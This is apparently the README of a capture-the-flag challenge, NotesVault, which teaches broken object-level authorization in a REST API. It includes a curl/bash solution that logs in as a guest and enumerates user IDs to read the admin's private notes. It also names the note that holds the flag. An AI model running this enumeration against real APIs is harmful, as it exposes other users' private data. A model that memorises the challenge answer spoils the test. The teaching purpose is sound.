# IDOR / BOLA — NotesVault

A REST API that authenticates callers (bearer token) but doesn't
authorise per-object access. Logged-in `guest` can read `admin`'s
private notes by changing the `user_id` segment in the URL.

OWASP API Top 10 #1: **Broken Object Level Authorization (BOLA)**.

## Player target

Read the admin user's private note containing the flag.

## Author solution sketch

```bash
TOK=$(curl -s http://target:5000/api/login \
        -H 'content-type: application/json' \
        -d '{"username":"guest","password":"guest"}' | jq -r .token)

# Guess admin's ID — round-numbered demo IDs are normal.
for id in 1 100 1000 1001 1234; do
  echo "=== $id ==="
  curl -s -H "Authorization: Bearer $TOK" \
       "http://target:5000/api/users/$id/notes"
done
```

`user_id=1001` returns the admin notes. The flag is in note `901`.

## Why this is the lesson

Authentication ≠ authorisation. Every handler that returns
user-owned data must check that the caller owns (or has been
granted access to) the specific record — not just that they hold
*any* valid token. The check belongs at the service layer, on
every read path.
